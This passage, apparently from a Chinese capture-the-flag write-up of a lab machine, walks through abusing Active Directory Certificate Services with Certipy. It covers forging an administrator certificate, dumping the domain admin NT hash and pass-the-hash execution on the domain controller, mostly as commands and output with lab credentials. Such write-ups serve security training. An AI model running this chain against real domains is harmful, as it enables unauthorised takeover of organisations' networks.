class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ly4k&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Requesting certificate via RPC&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Got error &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template &lt;span class=&#34;token keyword&#34;&gt;do&lt;/span&gt; not allow the current user to enroll &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; this &lt;span class=&#34;token builtin class-name&#34;&gt;type&lt;/span&gt; of certificate.&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Request ID is &lt;span class=&#34;token number&#34;&gt;26&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Would you like to save the private key? &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y/N&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; y&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Saved private key to &lt;span class=&#34;token number&#34;&gt;26&lt;/span&gt;.key&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Failed to request certificate&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PS D:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;miniconda&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Scripts&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;224签发和批准证书&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#224签发和批准证书&#34;&gt;#&lt;/a&gt; 2.2.4. 签发和批准证书&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;certipy.exe ca &lt;span class=&#34;token parameter variable&#34;&gt;-ca&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;manager-DC01-CA&#39;&lt;/span&gt; -issue-request &lt;span class=&#34;token number&#34;&gt;26&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-username&lt;/span&gt; raven@manager.htb &lt;span class=&#34;token parameter variable&#34;&gt;-password&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;R4v3nBe5tD3veloP3r!123&#39;&lt;/span&gt; -dc-ip &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;​				&lt;strong&gt;执行结果如下:&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PS D:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;miniconda&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Scripts&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; .&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;certipy.exe ca &lt;span class=&#34;token parameter variable&#34;&gt;-ca&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;manager-DC01-CA&#39;&lt;/span&gt; -issue-request &lt;span class=&#34;token number&#34;&gt;26&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-username&lt;/span&gt; raven@manager.htb &lt;span class=&#34;token parameter variable&#34;&gt;-password&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;R4v3nBe5tD3veloP3r!123&#39;&lt;/span&gt; -dc-ip &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Certipy v4.8.2 - by Oliver Lyak &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ly4k&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Successfully issued certificate&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;225请求签发的证书id下载对应证书凭证文件administratorpfx&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#225请求签发的证书id下载对应证书凭证文件administratorpfx&#34;&gt;#&lt;/a&gt; 2.2.5. 请求签发的证书 ID，下载对应证书凭证文件 (administrator.pfx)&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;certipy req &lt;span class=&#34;token parameter variable&#34;&gt;-username&lt;/span&gt; raven@manager.htb &lt;span class=&#34;token parameter variable&#34;&gt;-password&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;R4v3nBe5tD3veloP3r!123&#39;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-ca&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;manager-DC01-CA&#39;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-target&lt;/span&gt; manager.htb &lt;span class=&#34;token parameter variable&#34;&gt;-retrieve&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;26&lt;/span&gt; -dc-ip &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;​				&lt;strong&gt;执行结果如下:&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PS D:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;miniconda&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Scripts&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; certipy req &lt;span class=&#34;token parameter variable&#34;&gt;-username&lt;/span&gt; raven@manager.htb &lt;span class=&#34;token parameter variable&#34;&gt;-password&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;R4v3nBe5tD3veloP3r!123&#39;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-ca&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;manager-DC01-CA&#39;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-target&lt;/span&gt; manager.htb &lt;span class=&#34;token parameter variable&#34;&gt;-retrieve&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;26&lt;/span&gt; -dc-ip &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Certipy v4.8.2 - by Oliver Lyak &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ly4k&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Rerieving certificate with ID &lt;span class=&#34;token number&#34;&gt;26&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Successfully retrieved certificate&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Got certificate with UPN &lt;span class=&#34;token string&#34;&gt;&#39;administrator@manager.htb&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Certificate has no object SID&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Loaded private key from &lt;span class=&#34;token string&#34;&gt;&#39;26.key&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Saved certificate and private key to &lt;span class=&#34;token string&#34;&gt;&#39;administrator.pfx&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;23导出hashpth横向&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23导出hashpth横向&#34;&gt;#&lt;/a&gt; 2.3. 导出 hash，pth 横向&lt;/h3&gt;
&lt;h4 id=&#34;231与域控时间同步不然无法登录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#231与域控时间同步不然无法登录&#34;&gt;#&lt;/a&gt; 2.3.1. 与域控时间同步，不然无法登录&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;linux 同步命令：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; ntpdate &lt;span class=&#34;token parameter variable&#34;&gt;-s&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236 &lt;span class=&#34;token comment&#34;&gt;#ip 为域控 ip&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;win 同步命令：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sc start w32time &lt;span class=&#34;token comment&#34;&gt;#启动服务&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;w32tm /config /manualpeerlist:&lt;span class=&#34;token string&#34;&gt;&#34;10.129.102.122&#34;&lt;/span&gt; /syncfromflags:manual /reliable:YES /update &lt;span class=&#34;token comment&#34;&gt;#同步域控时间，ip 为域控 ip&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;232通过下载好的证书认证文件dump域管hash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#232通过下载好的证书认证文件dump域管hash&#34;&gt;#&lt;/a&gt; 2.3.2. 通过下载好的证书认证文件 dump 域管 hash&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;certipy auth &lt;span class=&#34;token parameter variable&#34;&gt;-pfx&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;administrator.pfx&#39;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-username&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;administrator&#39;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-domain&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;manager.htb&#39;&lt;/span&gt; -dc-ip &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;执行结果如下：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PS D:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;miniconda&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Scripts&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; certipy auth &lt;span class=&#34;token parameter variable&#34;&gt;-pfx&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;administrator.pfx&#39;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-username&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;administrator&#39;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-domain&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;manager.htb&#39;&lt;/span&gt; -dc-ip &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Certipy v4.8.2 - by Oliver Lyak &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ly4k&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Using principal: administrator@manager.htb&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Trying to get TGT&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;.&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Got TGT&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Saved credential cache to &lt;span class=&#34;token string&#34;&gt;&#39;administrator.ccache&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Trying to retrieve NT &lt;span class=&#34;token builtin class-name&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;administrator&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Got &lt;span class=&#34;token builtin class-name&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;administrator@manager.htb&#39;&lt;/span&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;233pthhash横向拿下域控&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#233pthhash横向拿下域控&#34;&gt;#&lt;/a&gt; 2.3.3.pth/hash 横向拿下域控&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nxc.exe wmi &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236 &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; administrator &lt;span class=&#34;token parameter variable&#34;&gt;-H&lt;/span&gt; ae5064c2f62317332c88629e025924ef &lt;span class=&#34;token parameter variable&#34;&gt;-x&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;whoami&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;执行结果如下：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PS E:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;渗透工具&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;提权+内网&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;密码喷洒&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; .&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;nxc.exe wmi &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236 &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; administrator &lt;span class=&#34;token parameter variable&#34;&gt;-H&lt;/span&gt; ae5064c2f62317332c88629e025924ef &lt;span class=&#34;token parameter variable&#34;&gt;-x&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;whoami&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;RPC         &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236    &lt;span class=&#34;token number&#34;&gt;135&lt;/span&gt;    DC01             &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Windows NT &lt;span class=&#34;token number&#34;&gt;10.0&lt;/span&gt; Build &lt;span class=&#34;token number&#34;&gt;17763&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name:DC01&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;domain:manager.htb&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;WMI         &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236    &lt;span class=&#34;token number&#34;&gt;135&lt;/span&gt;    DC01             &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; manager.htb&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;administrator:ae5064c2f62317332c88629e025924ef &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Pwn3d&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;WMI         &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236    &lt;span class=&#34;token number&#34;&gt;135&lt;/span&gt;    DC01             &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Executed command: &lt;span class=&#34;token string&#34;&gt;&#34;whoami&#34;&lt;/span&gt; via wmiexec&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;WMI         &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236    &lt;span class=&#34;token number&#34;&gt;135&lt;/span&gt;    DC01             manager&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;administrator&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;三注意与踩坑&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三注意与踩坑&#34;&gt;#&lt;/a&gt; 三。注意与踩坑&lt;/h2&gt;
&lt;h3 id=&#34;1221创建证书处&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1221创建证书处&#34;&gt;#&lt;/a&gt; 1. &lt;code&gt;2.2.1.创建证书&lt;/code&gt; 处：&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;ca 名称（-ca &#39;manager-DC01-CA&#39;），需要从 &lt;code&gt;2.1.查看域用户配置&lt;/code&gt; ，响应结果中的 ca name 中拿到&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;2224签发和批准证书处&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2224签发和批准证书处&#34;&gt;#&lt;/a&gt; 2. &lt;code&gt;2.2.4.签发和批准证书&lt;/code&gt; 处：&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;请求的证书 id（-issue-request 26），需要从 &lt;code&gt;2.2.3.请求证书&lt;/code&gt; ，响应结果中拿到&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;3时间同步&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3时间同步&#34;&gt;#&lt;/a&gt; 3. 时间同步&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;必须与域控时间同步，不然无法登录（ &lt;code&gt;2.3.1.与域控时间同步&lt;/code&gt; ）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;番外：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Certipy 命令&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Certipy v4.0.0 - by Oliver Lyak &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ly4k&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;usage: certipy shadow &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-h&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-account target account&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-device-id DEVICE_ID&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-debug&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-out output &lt;span class=&#34;token function&#34;&gt;file&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-scheme ldap scheme&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-dc-ip &lt;span class=&#34;token 